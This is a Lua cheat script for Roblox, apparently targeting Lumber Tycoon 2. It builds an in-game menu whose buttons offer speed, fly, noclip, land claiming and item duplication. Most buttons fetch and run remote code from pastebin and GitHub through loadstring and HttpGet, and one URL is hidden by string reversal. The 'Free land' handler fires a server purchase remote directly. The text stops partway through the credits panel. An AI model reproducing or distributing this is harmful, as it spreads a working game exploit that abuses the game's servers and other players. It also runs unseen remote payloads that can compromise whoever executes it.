-- Lumber Destroyer
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local playerframe = Instance.new("Frame")
local playertitle = Instance.new("TextLabel")
local closeP = Instance.new("TextButton")
local playerbframe = Instance.new("Frame")
local speed = Instance.new("TextButton")
local jump = Instance.new("TextButton")
local noclip = Instance.new("TextButton")
local fly = Instance.new("TextButton")
local itemtp = Instance.new("TextButton")
local btools = Instance.new("TextButton")
local tp = Instance.new("TextButton")
local nofog = Instance.new("TextButton")
local maxland = Instance.new("TextButton")
local leakeditems = Instance.new("TextButton")
local alwaysday = Instance.new("TextButton")
local allbp = Instance.new("TextButton")
local reset = Instance.new("TextButton")
local freeland = Instance.new("TextButton")
local openp = Instance.new("TextButton")
local guiframe = Instance.new("Frame")
local guititle = Instance.new("TextLabel")
local closeG = Instance.new("TextButton")
local guibframe = Instance.new("Frame")
local blood = Instance.new("TextButton")
local dirt = Instance.new("TextButton")
local zypher = Instance.new("TextButton")
local destiny = Instance.new("TextButton")
local autobuy = Instance.new("TextButton")
local trolling = Instance.new("TextButton")
local reptile = Instance.new("TextButton")
local darkhub = Instance.new("TextButton")
local zypher_2 = Instance.new("TextButton")
local blood2 = Instance.new("TextButton")
local shirosgui = Instance.new("TextButton")
local trolling2 = Instance.new("TextButton")
local openG = Instance.new("TextButton")
local dupeframe = Instance.new("Frame")
local dupetitle = Instance.new("TextLabel")
local closed = Instance.new("TextButton")
local dupebframe = Instance.new("Frame")
local axedupe = Instance.new("TextButton")
local dupe1 = Instance.new("TextButton")
local dupe2 = Instance.new("TextButton")
local itemdupe = Instance.new("TextLabel")
local opend = Instance.new("TextButton")
local creditsframe = Instance.new("Frame")
local creditstitle = Instance.new("TextLabel")
local closeC = Instance.new("TextButton")
local creditsbframe = Instance.new("Frame")
local specialthx = Instance.new("TextLabel")
local hib = Instance.new("TextLabel")
local andd = Instance.new("TextLabel")
local lumber = Instance.new("TextLabel")
local hu = Instance.new("TextLabel")
local unknown = Instance.new("TextLabel")
local openc = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

playerframe.Name = "playerframe"
playerframe.Parent = ScreenGui
playerframe.BackgroundColor3 = Color3.fromRGB(29, 0, 244)
playerframe.BorderSizePixel = 0
playerframe.Position = UDim2.new(0.0431115292, 0, -1.3575435e-08, 0)
playerframe.Size = UDim2.new(0, 178, 0, 38)

playertitle.Name = "playertitle"
playertitle.Parent = playerframe
playertitle.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
playertitle.Position = UDim2.new(0, 0, -0.0526315533, 0)
playertitle.Size = UDim2.new(0.996544361, 0, 0.800000012, 0)
playertitle.Font = Enum.Font.GothamBold
playertitle.Text = "Player"
playertitle.TextColor3 = Color3.fromRGB(255, 255, 255)
playertitle.TextSize = 20.000

closeP.Name = "closeP"
closeP.Parent = playerframe
closeP.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
closeP.BorderSizePixel = 0
closeP.Position = UDim2.new(0.047908321, 0, -0.0263157897, 0)
closeP.Size = UDim2.new(0.200000003, 0, 0, 30)
closeP.Font = Enum.Font.GothamBold
closeP.Text = "-"
closeP.TextColor3 = Color3.fromRGB(255, 255, 255)
closeP.TextSize = 20.000
closeP.MouseButton1Down:connect(function()
      playerbframe.Visible = false
      openp.Visible = true
end)

playerbframe.Name = "playerbframe"
playerbframe.Parent = playerframe
playerbframe.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
playerbframe.Position = UDim2.new(0.00213091564, 0, 0.986888885, 0)
playerbframe.Size = UDim2.new(0, 178, 0, 382)

speed.Name = "speed"
speed.Parent = playerbframe
speed.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
speed.BorderColor3 = Color3.fromRGB(29, 0, 244)
speed.BorderSizePixel = 0
speed.Position = UDim2.new(0.0112359552, 0, 0.000269787852, 0)
speed.Size = UDim2.new(0, 176, 0, 27)
speed.Font = Enum.Font.GothamBold
speed.Text = "Speed (x)"
speed.TextColor3 = Color3.fromRGB(255, 255, 255)
speed.TextSize = 20.000
speed.MouseButton1Down:connect(function()
       loadstring(game:HttpGet("https://pastebin.com/raw/KeE8gHeL"))()
end)

jump.Name = "jump"
jump.Parent = playerbframe
jump.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
jump.BorderColor3 = Color3.fromRGB(29, 0, 244)
jump.BorderSizePixel = 0
jump.Position = UDim2.new(0.0112359561, 0, 0.070226185, 0)
jump.Size = UDim2.new(0, 176, 0, 27)
jump.Font = Enum.Font.GothamBold
jump.Text = "Infinite Jump"
jump.TextColor3 = Color3.fromRGB(255, 255, 255)
jump.TextSize = 20.000
jump.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/V3DKCQTT"))()
end)

noclip.Name = "noclip"
noclip.Parent = playerbframe
noclip.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
noclip.BorderColor3 = Color3.fromRGB(29, 0, 244)
noclip.BorderSizePixel = 0
noclip.Position = UDim2.new(0.00561797759, 0, 0.129447341, 0)
noclip.Size = UDim2.new(0, 176, 0, 27)
noclip.Font = Enum.Font.GothamBold
noclip.Text = "Noclip"
noclip.TextColor3 = Color3.fromRGB(255, 255, 255)
noclip.TextSize = 20.000
noclip.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/xV8KkUXh"))()
end)


fly.Name = "fly"
fly.Parent = playerbframe
fly.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
fly.BorderColor3 = Color3.fromRGB(29, 0, 244)
fly.BorderSizePixel = 0
fly.Position = UDim2.new(0.00561797712, 0, 0.198875636, 0)
fly.Size = UDim2.new(0, 176, 0, 27)
fly.Font = Enum.Font.GothamBold
fly.Text = "Fly"
fly.TextColor3 = Color3.fromRGB(255, 255, 255)
fly.TextSize = 20.000
fly.MouseButton1Down:connect(function()
       loadstring(game:HttpGet("https://pastebin.com/raw/9aqDF6nw"))()
end)

itemtp.Name = "itemtp"
itemtp.Parent = playerbframe
itemtp.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
itemtp.BorderColor3 = Color3.fromRGB(29, 0, 244)
itemtp.BorderSizePixel = 0
itemtp.Position = UDim2.new(0.00561797712, 0, 0.266214222, 0)
itemtp.Size = UDim2.new(0, 176, 0, 27)
itemtp.Font = Enum.Font.GothamBold
itemtp.Text = "Item Tp"
itemtp.TextColor3 = Color3.fromRGB(255, 255, 255)
itemtp.TextSize = 20.000
itemtp.MouseButton1Down:connect(function()
      loadstring(game:GetObjects("rbxassetid://4832010530")[1].Source)()
end)

btools.Name = "btools"
btools.Parent = playerbframe
btools.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
btools.BorderColor3 = Color3.fromRGB(29, 0, 244)
btools.BorderSizePixel = 0
btools.Position = UDim2.new(0.00561797712, 0, 0.333552837, 0)
btools.Size = UDim2.new(0, 176, 0, 27)
btools.Font = Enum.Font.GothamBold
btools.Text = "Btools"
btools.TextColor3 = Color3.fromRGB(255, 255, 255)
btools.TextSize = 20.000
btools.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/NjttFM2K"))()
end)

tp.Name = "tp"
tp.Parent = playerbframe
tp.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
tp.BorderColor3 = Color3.fromRGB(29, 0, 244)
tp.BorderSizePixel = 0
tp.Position = UDim2.new(0.0112359552, 0, 0.400891423, 0)
tp.Size = UDim2.new(0, 176, 0, 27)
tp.Font = Enum.Font.GothamBold
tp.Text = "Tp"
tp.TextColor3 = Color3.fromRGB(255, 255, 255)
tp.TextSize = 20.000
tp.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/P86D17Qj"))()
end)

nofog.Name = "nofog"
nofog.Parent = playerbframe
nofog.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
nofog.BorderColor3 = Color3.fromRGB(29, 0, 244)
nofog.BorderSizePixel = 0
nofog.Position = UDim2.new(0.00561797712, 0, 0.470847815, 0)
nofog.Size = UDim2.new(0, 176, 0, 27)
nofog.Font = Enum.Font.GothamBold
nofog.Text = "No Fog"
nofog.TextColor3 = Color3.fromRGB(255, 255, 255)
nofog.TextSize = 20.000
nofog.MouseButton1Down:connect(function()
       loadstring(game:HttpGet("https://pastebin.com/raw/wXCsYF1y"))()
end)

maxland.Name = "maxland"
maxland.Parent = playerbframe
maxland.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
maxland.BorderColor3 = Color3.fromRGB(29, 0, 244)
maxland.BorderSizePixel = 0
maxland.Position = UDim2.new(0.0112359552, 0, 0.532950819, 0)
maxland.Size = UDim2.new(0, 176, 0, 27)
maxland.Font = Enum.Font.GothamBold
maxland.Text = "Max land"
maxland.TextColor3 = Color3.fromRGB(255, 255, 255)
maxland.TextSize = 20.000
maxland.MouseButton1Down:connect(function()
       loadstring(game:HttpGet("https://pastebin.com/raw/gRa6JkJb"))()
end)

leakeditems.Name = "leakeditems"
leakeditems.Parent = playerbframe
leakeditems.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
leakeditems.BorderColor3 = Color3.fromRGB(29, 0, 244)
leakeditems.BorderSizePixel = 0
leakeditems.Position = UDim2.new(0.00561797759, 0, 0.600289345, 0)
leakeditems.Size = UDim2.new(0, 176, 0, 27)
leakeditems.Font = Enum.Font.GothamBold
leakeditems.Text = "Leaked items"
leakeditems.TextColor3 = Color3.fromRGB(255, 255, 255)
leakeditems.TextSize = 20.000
leakeditems.MouseButton1Down:connect(function()
      game.ReplicatedStorage.Purchasables:Clone().Parent = game.Workspace.PlayerModels
end)

alwaysday.Name = "alwaysday"
alwaysday.Parent = playerbframe
alwaysday.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
alwaysday.BorderColor3 = Color3.fromRGB(29, 0, 244)
alwaysday.BorderSizePixel = 0
alwaysday.Position = UDim2.new(0.0112359552, 0, 0.672863603, 0)
alwaysday.Size = UDim2.new(0, 176, 0, 27)
alwaysday.Font = Enum.Font.GothamBold
alwaysday.Text = "Always Day"
alwaysday.TextColor3 = Color3.fromRGB(255, 255, 255)
alwaysday.TextSize = 20.000
alwaysday.MouseButton1Down:connect(function()
       loadstring(game:HttpGet("https://pastebin.com/raw/TusQaMzu"))()
end)

allbp.Name = "allbp"
allbp.Parent = playerbframe
allbp.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
allbp.BorderColor3 = Color3.fromRGB(29, 0, 244)
allbp.BorderSizePixel = 0
allbp.Position = UDim2.new(0.0112359552, 0, 0.742555976, 0)
allbp.Size = UDim2.new(0, 176, 0, 27)
allbp.Font = Enum.Font.GothamBold
allbp.Text = "All Blueprints"
allbp.TextColor3 = Color3.fromRGB(255, 255, 255)
allbp.TextSize = 20.000
allbp.MouseButton1Down:connect(function()
       loadstring(game:HttpGet("https://pastebin.com/raw/Zz5TeQXY"))()
end)


reset.Name = "reset"
reset.Parent = playerbframe
reset.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
reset.BorderColor3 = Color3.fromRGB(29, 0, 244)
reset.BorderSizePixel = 0
reset.Position = UDim2.new(0.0112359561, 0, 0.812248349, 0)
reset.Size = UDim2.new(0, 176, 0, 27)
reset.Font = Enum.Font.GothamBold
reset.Text = "Reset"
reset.TextColor3 = Color3.fromRGB(255, 255, 255)
reset.TextSize = 20.000
reset.MouseButton1Down:connect(function()
       game.Players.LocalPlayer.Character.Head:Destroy()
end)

freeland.Name = "freeland"
freeland.Parent = playerbframe
freeland.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
freeland.BorderColor3 = Color3.fromRGB(29, 0, 244)
freeland.BorderSizePixel = 0
freeland.Position = UDim2.new(9.31322575e-10, 0, 0.882928967, 0)
freeland.Size = UDim2.new(0, 176, 0, 27)
freeland.Font = Enum.Font.GothamBold
freeland.Text = "Free land"
freeland.TextColor3 = Color3.fromRGB(255, 255, 255)
freeland.TextSize = 20.000
freeland.MouseButton1Down:connect(function()
      for a,b in pairs(workspace.Properties:GetChildren()) do 
    if b:FindFirstChild("Owner") and b:FindFirstChild("OriginSquare") and b.Owner.Value == nil then 
        game.ReplicatedStorage.PropertyPurchasing.ClientPurchasedProperty:FireServer(b, b.OriginSquare.OriginCFrame.Value.p + Vector3.new(0,3,0))
 wait(0.5)
        Instance.new('RemoteEvent', game:service'ReplicatedStorage'.Interaction).Name = "Ban"
	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
		if v.Owner.Value == game.Players.LocalPlayer then
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame + Vector3.new(0,10,0)
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(0.1)
		end
	end

  --     game.Players.LocalPlayer.Character:MoveTo(b.OriginSquare.Position)
        break
    end
end
end)

openp.Name = "openp"
openp.Parent = playerframe
openp.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
openp.BorderSizePixel = 0
openp.Position = UDim2.new(0.735059142, 0, -0.0263157934, 0)
openp.Size = UDim2.new(0.200000003, 0, 0, 30)
openp.Font = Enum.Font.GothamBold
openp.Text = "+"
openp.TextColor3 = Color3.fromRGB(255, 255, 255)
openp.TextSize = 20.000
openp.MouseButton1Down:connect(function()
      playerbframe.Visible = true
      openp.Visible = true
end)

guiframe.Name = "guiframe"
guiframe.Parent = ScreenGui
guiframe.BackgroundColor3 = Color3.fromRGB(29, 0, 244)
guiframe.BorderSizePixel = 0
guiframe.Position = UDim2.new(0.291471392, 0, -1.3575435e-08, 0)
guiframe.Size = UDim2.new(0, 180, 0, 38)

guititle.Name = "guititle"
guititle.Parent = guiframe
guititle.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
guititle.Position = UDim2.new(0, 0, -0.0263157636, 0)
guititle.Size = UDim2.new(0.990925014, 0, 0.800000012, 0)
guititle.Font = Enum.Font.GothamBold
guititle.Text = "Gui"
guititle.TextColor3 = Color3.fromRGB(255, 255, 255)
guititle.TextSize = 20.000

closeG.Name = "closeG"
closeG.Parent = guiframe
closeG.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
closeG.BorderSizePixel = 0
closeG.Position = UDim2.new(0.0631783009, 0, -0.0263157897, 0)
closeG.Size = UDim2.new(0.200000003, 0, 0, 30)
closeG.Font = Enum.Font.GothamBold
closeG.Text = "-"
closeG.TextColor3 = Color3.fromRGB(255, 255, 255)
closeG.TextSize = 20.000
closeG.MouseButton1Down:connect(function()
      guibframe.Visible = false
      openG.Visible = true
end)

guibframe.Name = "guibframe"
guibframe.Parent = guiframe
guibframe.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
guibframe.Position = UDim2.new(0.00213097455, 0, 0.986888885, 0)
guibframe.Size = UDim2.new(0, 178, 0, 328)

blood.Name = "blood"
blood.Parent = guibframe
blood.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
blood.BorderColor3 = Color3.fromRGB(29, 0, 244)
blood.BorderSizePixel = 0
blood.Position = UDim2.new(0, 0, 0.000269800425, 0)
blood.Size = UDim2.new(0, 176, 0, 27)
blood.Font = Enum.Font.GothamBold
blood.Text = "Blood"
blood.TextColor3 = Color3.fromRGB(255, 255, 255)
blood.TextSize = 20.000
blood.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/Cdwqa3iY"))()
end)

dirt.Name = "dirt"
dirt.Parent = guibframe
dirt.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
dirt.BorderColor3 = Color3.fromRGB(29, 0, 244)
dirt.BorderSizePixel = 0
dirt.Position = UDim2.new(0, 0, 0.0812953189, 0)
dirt.Size = UDim2.new(0, 176, 0, 27)
dirt.Font = Enum.Font.GothamBold
dirt.Text = "Dirt"
dirt.TextColor3 = Color3.fromRGB(255, 255, 255)
dirt.TextSize = 20.000
dirt.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/XLNPrjJw"))()
end)

zypher.Name = "zypher"
zypher.Parent = guibframe
zypher.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
zypher.BorderColor3 = Color3.fromRGB(29, 0, 244)
zypher.BorderSizePixel = 0
zypher.Position = UDim2.new(0, 0, 0.152840614, 0)
zypher.Size = UDim2.new(0, 176, 0, 27)
zypher.Font = Enum.Font.GothamBold
zypher.Text = "Zypher"
zypher.TextColor3 = Color3.fromRGB(255, 255, 255)
zypher.TextSize = 20.000
zypher.MouseButton1Down:connect(function()
      loadstring(game:HttpGet(('https://raw.githubusercontent.com/xTheAlex14/zypher/master/zypherupdatednew'),true))()
end)

destiny.Name = "destiny"
destiny.Parent = guibframe
destiny.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
destiny.BorderColor3 = Color3.fromRGB(29, 0, 244)
destiny.BorderSizePixel = 0
destiny.Position = UDim2.new(0.00561797759, 0, 0.233699188, 0)
destiny.Size = UDim2.new(0, 176, 0, 27)
destiny.Font = Enum.Font.GothamBold
destiny.Text = "Destiny"
destiny.TextColor3 = Color3.fromRGB(255, 255, 255)
destiny.TextSize = 20.000
destiny.MouseButton1Down:connect(function()
      script=loadstring(game:HttpGet(('XaqMU09L/war/moc.nibetsap//:sptth'):reverse(),true))()
end)

autobuy.Name = "autobuy"
autobuy.Parent = guibframe
autobuy.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
autobuy.BorderColor3 = Color3.fromRGB(29, 0, 244)
autobuy.BorderSizePixel = 0
autobuy.Position = UDim2.new(0.0112359552, 0, 0.311508983, 0)
autobuy.Size = UDim2.new(0, 176, 0, 27)
autobuy.Font = Enum.Font.GothamBold
autobuy.Text = "Autobuy"
autobuy.TextColor3 = Color3.fromRGB(255, 255, 255)
autobuy.TextSize = 20.000
autobuy.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/udjAimCp"))()
end)

trolling.Name = "trolling"
trolling.Parent = guibframe
trolling.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
trolling.BorderColor3 = Color3.fromRGB(29, 0, 244)
trolling.BorderSizePixel = 0
trolling.Position = UDim2.new(0.0112359542, 0, 0.389318794, 0)
trolling.Size = UDim2.new(0, 176, 0, 27)
trolling.Font = Enum.Font.GothamBold
trolling.Text = "Trolling"
trolling.TextColor3 = Color3.fromRGB(255, 255, 255)
trolling.TextSize = 20.000
trolling.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/RNWgaqCE", true))()
end)

reptile.Name = "reptile"
reptile.Parent = guibframe
reptile.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
reptile.BorderColor3 = Color3.fromRGB(29, 0, 244)
reptile.BorderSizePixel = 0
reptile.Position = UDim2.new(0.0168539323, 0, 0.467128575, 0)
reptile.Size = UDim2.new(0, 176, 0, 27)
reptile.Font = Enum.Font.GothamBold
reptile.Text = "Reptile"
reptile.TextColor3 = Color3.fromRGB(255, 255, 255)
reptile.TextSize = 20.000
reptile.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/p2LWcrBx"))()
end)

darkhub.Name = "darkhub"
darkhub.Parent = guibframe
darkhub.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
darkhub.BorderColor3 = Color3.fromRGB(29, 0, 244)
darkhub.BorderSizePixel = 0
darkhub.Position = UDim2.new(0.0168539323, 0, 0.544938385, 0)
darkhub.Size = UDim2.new(0, 176, 0, 27)
darkhub.Font = Enum.Font.GothamBold
darkhub.Text = "Dark hub"
darkhub.TextColor3 = Color3.fromRGB(255, 255, 255)
darkhub.TextSize = 20.000
darkhub.MouseButton1Down:connect(function()
     loadstring(game:HttpGet(("https://pastebin.com/raw/yCrBkPaY"), true))()
end)

zypher_2.Name = "zypher"
zypher_2.Parent = guibframe
zypher_2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
zypher_2.BorderColor3 = Color3.fromRGB(29, 0, 244)
zypher_2.BorderSizePixel = 0
zypher_2.Position = UDim2.new(0.0112359552, 0, 0.622748196, 0)
zypher_2.Size = UDim2.new(0, 176, 0, 27)
zypher_2.Font = Enum.Font.GothamBold
zypher_2.Text = "Zypher V2"
zypher_2.TextColor3 = Color3.fromRGB(255, 255, 255)
zypher_2.TextSize = 20.000
zypher_2.MouseButton1Down:connect(function()
      loadstring(game:HttpGet(('https://raw.githubusercontent.com/xTheAlex14/zypher/master/v2'),true))()
end)

blood2.Name = "blood2"
blood2.Parent = guibframe
blood2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
blood2.BorderColor3 = Color3.fromRGB(29, 0, 244)
blood2.BorderSizePixel = 0
blood2.Position = UDim2.new(0.00561797759, 0, 0.703773737, 0)
blood2.Size = UDim2.new(0, 176, 0, 27)
blood2.Font = Enum.Font.GothamBold
blood2.Text = "Blood 2"
blood2.TextColor3 = Color3.fromRGB(255, 255, 255)
blood2.TextSize = 20.000
blood2.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/Cdwqa3iY"))()
end)

shirosgui.Name = "shirosgui"
shirosgui.Parent = guibframe
shirosgui.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
shirosgui.BorderColor3 = Color3.fromRGB(29, 0, 244)
shirosgui.BorderSizePixel = 0
shirosgui.Position = UDim2.new(0, 0, 0.784465253, 0)
shirosgui.Size = UDim2.new(0, 176, 0, 27)
shirosgui.Font = Enum.Font.GothamBold
shirosgui.Text = "Shiros Gui"
shirosgui.TextColor3 = Color3.fromRGB(255, 255, 255)
shirosgui.TextSize = 20.000
shirosgui.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/qzsLHpF9"))()
end)

trolling2.Name = "trolling2"
trolling2.Parent = guibframe
trolling2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
trolling2.BorderColor3 = Color3.fromRGB(29, 0, 244)
trolling2.BorderSizePixel = 0
trolling2.Position = UDim2.new(0.0168539323, 0, 0.86629039, 0)
trolling2.Size = UDim2.new(0, 176, 0, 27)
trolling2.Font = Enum.Font.GothamBold
trolling2.Text = "trolling 2"
trolling2.TextColor3 = Color3.fromRGB(255, 255, 255)
trolling2.TextSize = 20.000
trolling2.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/U290qDC2"))()
end)

openG.Name = "openG"
openG.Parent = guiframe
openG.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
openG.BorderSizePixel = 0
openG.Position = UDim2.new(0.797908306, 0, -0.0526315793, 0)
openG.Size = UDim2.new(0.200000003, 0, 0, 30)
openG.Font = Enum.Font.GothamBold
openG.Text = "+"
openG.TextColor3 = Color3.fromRGB(255, 255, 255)
openG.TextSize = 20.000
openG.MouseButton1Down:connect(function()
      guibframe.Visible = true
      openG.Visible = true
end)

dupeframe.Name = "dupeframe"
dupeframe.Parent = ScreenGui
dupeframe.BackgroundColor3 = Color3.fromRGB(29, 0, 244)
dupeframe.BorderSizePixel = 0
dupeframe.Position = UDim2.new(0.541705728, 0, -1.3038516e-08, 0)
dupeframe.Size = UDim2.new(0, 179, 0, 38)

dupetitle.Name = "dupetitle"
dupetitle.Parent = dupeframe
dupetitle.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
dupetitle.Position = UDim2.new(0, 0, -0.0263157636, 0)
dupetitle.Size = UDim2.new(0.999999821, 0, 0.800000012, 0)
dupetitle.Font = Enum.Font.GothamBold
dupetitle.Text = "Dupe"
dupetitle.TextColor3 = Color3.fromRGB(255, 255, 255)
dupetitle.TextSize = 20.000

closed.Name = "closed"
closed.Parent = dupeframe
closed.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
closed.BorderSizePixel = 0
closed.Position = UDim2.new(0.00880217552, 0, 0, 0)
closed.Size = UDim2.new(0.200000003, 0, 0, 30)
closed.Font = Enum.Font.GothamBold
closed.Text = "-"
closed.TextColor3 = Color3.fromRGB(255, 255, 255)
closed.TextSize = 20.000
closed.MouseButton1Down:connect(function()
      dupebframe.Visible = false
      opend.Visible = true
end)

dupebframe.Name = "dupebframe"
dupebframe.Parent = dupeframe
dupebframe.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
dupebframe.Position = UDim2.new(0.00213111588, 0, 0.986888885, 0)
dupebframe.Size = UDim2.new(0, 178, 0, 222)

axedupe.Name = "axedupe"
axedupe.Parent = dupebframe
axedupe.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
axedupe.BorderSizePixel = 0
axedupe.Position = UDim2.new(0, 0, 0.0450450443, 0)
axedupe.Size = UDim2.new(0, 176, 0, 33)
axedupe.Font = Enum.Font.GothamBold
axedupe.Text = "Dupe Axes"
axedupe.TextColor3 = Color3.fromRGB(255, 255, 255)
axedupe.TextSize = 20.000
axedupe.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/YZpipe18"))()
end)

dupe1.Name = "dupe1"
dupe1.Parent = dupebframe
dupe1.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
dupe1.BorderSizePixel = 0
dupe1.Position = UDim2.new(0, 0, 0.558558524, 0)
dupe1.Size = UDim2.new(0, 176, 0, 33)
dupe1.Font = Enum.Font.GothamBold
dupe1.Text = "Dupe 1"
dupe1.TextColor3 = Color3.fromRGB(255, 255, 255)
dupe1.TextSize = 20.000
dupe1.MouseButton1Down:connect(function()
      script=loadstring(game:HttpGet("https://pastebin.com/raw/XwLSKeAc", true))()
end)

dupe2.Name = "dupe2"
dupe2.Parent = dupebframe
dupe2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
dupe2.BorderSizePixel = 0
dupe2.Position = UDim2.new(0.0112359552, 0, 0.77477473, 0)
dupe2.Size = UDim2.new(0, 176, 0, 33)
dupe2.Font = Enum.Font.GothamBold
dupe2.Text = "Dupe 2"
dupe2.TextColor3 = Color3.fromRGB(255, 255, 255)
dupe2.TextSize = 20.000
dupe2.MouseButton1Down:connect(function()
      loadstring(game:HttpGet("https://pastebin.com/raw/Uu70gwHt", true))()
end)

itemdupe.Name = "itemdupe"
itemdupe.Parent = dupebframe
itemdupe.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
itemdupe.BorderSizePixel = 0
itemdupe.Position = UDim2.new(0.0112359552, 0, 0.265765756, 0)
itemdupe.Size = UDim2.new(0, 174, 0, 39)
itemdupe.Font = Enum.Font.GothamBold
itemdupe.Text = "Item dupe scripts"
itemdupe.TextColor3 = Color3.fromRGB(29, 0, 244)
itemdupe.TextSize = 20.000

opend.Name = "opend"
opend.Parent = dupeframe
opend.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
opend.BorderSizePixel = 0
opend.Position = UDim2.new(0.785338461, 0, -0.0526315831, 0)
opend.Size = UDim2.new(0.200000003, 0, 0, 30)
opend.Font = Enum.Font.GothamBold
opend.Text = "+"
opend.TextColor3 = Color3.fromRGB(255, 255, 255)
opend.TextSize = 20.000
opend.MouseButton1Down:connect(function()
      dupebframe.Visible = true
      opend.Visible = true
end)


creditsframe.Name = "creditsframe"
creditsframe.Parent = ScreenGui
creditsframe.BackgroundColor3 = Color3.fromRGB(29, 0, 244)
creditsframe.BorderSizePixel = 0
creditsframe.Position = UDim2.new(0.790065587, 0, -0.00177937245, 0)
creditsframe.Size = UDim2.new(0, 179, 0, 38)

creditstitle.Name = "creditstitle"
creditstitle.Parent = creditsframe
creditstitle.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
creditstitle.Position = UDim2.new(0, 0, -0.0263157636, 0)
creditstitle.Size = UDim2.new(0.990925014, 0, 0.800000012, 0)
creditstitle.Font = Enum.Font.GothamBold
creditstitle.Text = "Credits"
creditstitle.TextColor3 = Color3.fromRGB(255, 255, 255)
creditstitle.TextSize = 20.000

closeC.Name = "closeC"
closeC.Parent = creditsframe
closeC.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
closeC.BorderSizePixel = 0
closeC.Position = UDim2.new(0.0814278722, 0, -0.0263157897, 0)
closeC.Size = UDim2.new(0.200000003, 0, 0, 30)
closeC.Font = Enum.Font.GothamBold
closeC.Text = "-"
closeC.TextColor3 = Color3.fromRGB(255, 255, 255)
closeC.TextSize = 20.000
closeC.MouseButton1Down:connect(function()
      creditsbframe.Visible = false
      openc.Visible = true
end)


creditsbframe.Name = "creditsbframe"
creditsbframe.Parent = creditsframe
creditsbframe.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
creditsbframe.Position = UDim2.new(0.00213111588, 0, 0.986888885, 0)
creditsbframe.Size = UDim2.new(0, 178, 0, 241)

specialthx.Name = "specialthx"
specialthx.Parent = creditsbframe
specialthx.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
specialthx.BorderSizePixel = 0
specialthx.Position = UDim2.new(0.00561797759, 0, 0.00448430516, 0)
specialthx.Size = UDim2.new(0, 176, 0, 35)
specialthx.Font = Enum.Font.GothamBold
specialthx.Text = "Special thanks to"
specialthx.TextColor3 = Color3.fromRGB(255, 255, 255)
specialthx.TextSize = 20.000

hib.Name = "hib"
hib.Parent = creditsbframe
hib.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
hib.BorderSizePixel = 0
hib.Position = UDim2.new(0.0112359552, 0, 0.156950682, 0)
hib.Size = UDim2.new(0, 176, 0, 35)
hib.Font = Enum.Font.GothamBold
hib.Text = "hibjr7"
hib.TextColor3 = Color3.fromRGB(255, 255, 255)
hib.TextSize = 25.000

andd.Name = "andd"
andd.Parent = creditsbframe
andd.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
andd.BorderSizePixel = 0
andd.Position = UDim2.new(-0.00561797759, 0, 0.304932714, 0)
andd.Size = UDim2.new(0, 176, 0, 35)
